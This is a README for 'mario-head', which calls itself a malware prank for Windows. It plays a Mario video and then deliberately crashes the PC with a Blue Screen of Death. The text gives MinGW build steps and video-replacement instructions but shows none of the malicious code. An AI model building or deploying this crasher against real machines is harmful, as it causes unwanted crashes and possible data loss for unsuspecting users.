# mario-head
A little malware script to display a video of Mario's levitating head, asking if he can have your computer, and crashing your PC with a Blue Screen of Death.

Made using standard Windows libraries, primarily DirectShow.

## Building
First off, you need some dependencies installed:
- [MinGW](https://en.wikipedia.org/wiki/MinGW)
    - On Windows, it's recommended to use [MSYS2](https://www.msys2.org/). 
    - After installing MSYS2 (or if you are on an Arch-based Linux distro), run `pacman -S mingw-w64-gcc` in the terminal to  
      install MinGW.
    - On other Linux distributions, search for `mingw-w64` in your package manager.
- [Git](https://git-scm.com/)
    - It's optional, since you can download the source code as a ZIP file, but it's recommended to have it installed. It will 
      make pulling the latest source code easier.
- `winpthreads` library from Git
    - This is only needed if you want to extend compatibility to Windows 2000/XP. The reason for that is because the latest 
      stable release doesn't include a fix for `GetTickCount64` function usage, which is only implemented from Vista onwards.
    - As for the installation, it depends on your OS:
        - If you are on MSYS2, run `pacman -S mingw-w64-i686-winpthreads-git` in the terminal to install it.
        - If you are on an Arch-based Linux distro, you can use the [`mingw-w64-winpthreads-git`](https://aur.archlinux.org/packages/mingw-w64-winpthreads-git/) AUR package, just install it with your favorite AUR helper.
        - On other Linux distributions, you will need to build it yourself. You can find the source code [here](https://sourceforge.net/p/mingw-w64/mingw-w64).

Before building this project, check the [`Makefile`](Makefile) and make sure the [`CXX`](Makefile#L1) and [`WINDRES`](Makefile#L2) variables are set correctly to your environment. If you are using MSYS2 or Arch Linux, you can leave them as is. If you are using another Linux distribution, you may need to change them respectively.

Finally, run `make` (or `mingw-w64-i686-make`) in the root directory of the repository to build the executable.

## The Video
The default [`assets/video.wmv`](assets/video.wmv) comes from [Mario Teaches Typing 2](https://www.mariowiki.com/Mario_Teaches_Typing_2). It's a clip of one of Mario's quotes that is played on the level select screen. The exact source is extracted from [the playthrough by NintendoComplete](https://youtu.be/PjyChE4NFXk?t=1370), at 22:50.

If you want to use a different video, you can replace the `assets/video.wmv` file with your own. Just make sure it's a Windows Media Video file, and that it's named `video.wmv`. To convert a video to WMV, you can use [FFmpeg](https://ffmpeg.org/), for example:
```sh
ffmpeg -i input.mp4 -b 512k output.wmv
```

## License
This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

Contributions are welcome, really welcome, in fact! If you want to contribute, whether it's just a simple question or a whole pull request, feel free to do so.